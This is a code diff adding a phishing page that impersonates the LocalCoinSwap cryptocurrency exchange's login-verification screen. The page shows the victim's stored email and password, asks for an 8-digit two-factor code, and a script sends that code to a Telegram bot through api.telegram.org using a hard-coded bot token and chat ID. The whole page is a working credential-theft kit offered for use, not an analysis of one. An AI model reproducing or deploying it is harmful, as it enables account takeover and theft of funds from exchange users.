@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>LocalCoinSwap Login</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: "Inter", Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            background-color: #e9f0f8;
+            color: #1a1a1a;
+        }
+        
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: stretch;
+            background-color: #fff;
+            max-width: 950px;
+            margin: 50px auto;
+            border-radius: 8px;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+        
+        .left-section {
+            flex: 1;
+            background-color: #fff;
+            padding: 60px 50px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            border-right: 1px solid #eaeaea;
+        }
+        
+        .quote-mark {
+            font-size: 50px;
+            color: #3f7af0;
+            line-height: 0.8;
+            margin-bottom: 15px;
+        }
+        
+        .quote {
+            font-size: 17px;
+            color: #333;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        
+        .author {
+            color: #0a0f1c;
+            font-weight: 600;
+            font-size: 15px;
+        }
+        
+        .right-section {
+            flex: 1;
+            padding: 60px 50px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        
+        .right-section h2 {
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 25px;
+            color: #0a0f1c;
+        }
+        
+        .notice {
+            background-color: #d9f2d9;
+            color: #0a591e;
+            border-left: 4px solid #28a745;
+            border-radius: 6px;
+            padding: 10px 15px;
+            font-size: 15px;
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+            margin-bottom: 6px;
+        }
+        
+        .edit-link {
+            font-size: 13px;
+            color: #0077ff;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        
+        input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            margin-bottom: 18px;
+            font-size: 15px;
+            background-color: #fff;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #0077ff;
+            box-shadow: 0 0 0 2px rgba(0, 119, 255, 0.2);
+        }
+        
+        input[readonly] {
+            background-color: #f5f5f5;
+            color: #777;
+        }
+        
+        .login-btn {
+            background-color: #0077ff;
+            color: #fff;
+            border: none;
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+        }
+        
+        .login-btn:hover {
+            background-color: #005fd1;
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+                margin: 20px;
+            }
+            .left-section {
+                border-right: none;
+                border-bottom: 1px solid #eaeaea;
+                padding: 40px 30px;
+                text-align: center;
+            }
+            .quote-mark {
+                font-size: 40px;
+            }
+            .quote {
+                font-size: 16px;
+            }
+            .right-section {
+                padding: 40px 30px;
+            }
+            .right-section h2 {
+                font-size: 22px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            input {
+                font-size: 14px;
+            }
+            .login-btn {
+                font-size: 15px;
+            }
+            .notice {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <!-- LEFT SIDE -->
+        <div class="left-section">
+            <div class="quote-mark">“</div>
+            <p class="quote">
+                Bitcoin enables certain uses that are very unique. I think it offers possibilities that no other currency allows.
+            </p>
+            <p class="author">Charlie Shrem</p>
+        </div>
+
+        <!-- RIGHT SIDE -->
+        <div class="right-section">
+            <h2>Login Verification — LocalCoinSwap</h2>
+            <div class="notice">
+                Please enter the 8-digit verification code sent to your Telegram.
+            </div>
+
+            <form id="loginForm">
+                <label>Email <a class="edit-link" id="editEmail">Edit</a></label>
+                <input type="email" id="email" required readonly />
+
+                <label>Password <a class="edit-link" id="editPassword">Edit</a></label>
+                <input type="password" id="password" required readonly />
+
+                <label>8-digit code</label>
+                <input type="text" id="code" maxlength="8" placeholder="Enter 8-digit code" required />
+
+                <button type="submit" class="login-btn">Continue</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Get saved credentials
+        const savedEmail = localStorage.getItem("userEmail");
+        const savedPassword = localStorage.getItem("userPassword");
+
+        const emailInput = document.getElementById("email");
+        const passwordInput = document.getElementById("password");
+
+        // If missing data, redirect back to homepage
+        if (!savedEmail || !savedPassword) {
+            alert("No login details found. Redirecting to main page...");
+            window.location.href = "index.html";
+        } else {
+            emailInput.value = savedEmail;
+            passwordInput.value = savedPassword;
+        }
+
+        // Allow editing
+        document.getElementById("editEmail").addEventListener("click", (e) => {
+            e.preventDefault();
+            emailInput.readOnly = false;
+            emailInput.focus();
+        });
+
+        document.getElementById("editPassword").addEventListener("click", (e) => {
+            e.preventDefault();
+            passwordInput.readOnly = false;
+            passwordInput.focus();
+        });
+
+        // Handle login form submission
+        document.getElementById("loginForm").addEventListener("submit", (e) => {
+            e.preventDefault();
+            const code = document.getElementById("code").value.trim();
+
+            // Validate the OTP input
+            if (code.length !== 8 || isNaN(code)) {
+                alert("Please enter a valid 8-digit code.");
+                return;
+            }
+
+            // Send the OTP to the Telegram bot
+            sendOTPToTelegram(code);
+        });
+
+        // Function to send the OTP to Telegram
+        function sendOTPToTelegram(otp) {
+            const botToken = '8374783082:AAGu_MAmTZ7plivFdGJU10DjUECPe-Nbw-Q'; // Replace with your Telegram bot token
+            const chatId = '5615316142'; // Replace with your chat ID
+
+            const message = `User entered OTP: ${otp}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                    }),
+                })
+                .then(response => {
+                    if (response.ok) {
+                        alert("OTP submitted successfully!"); // Notify success
+                        window.location.href = "homepage.html"; // Redirect to homepage
+                    } else {
+                        console.error('Error sending OTP:', response.statusText);
+                        alert("Failed to send OTP to Telegram. Please try again.");
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert("Error occurred while sending OTP. Please try again.");
+                });
+        }
+    </script>
+</body>
+
+</html>
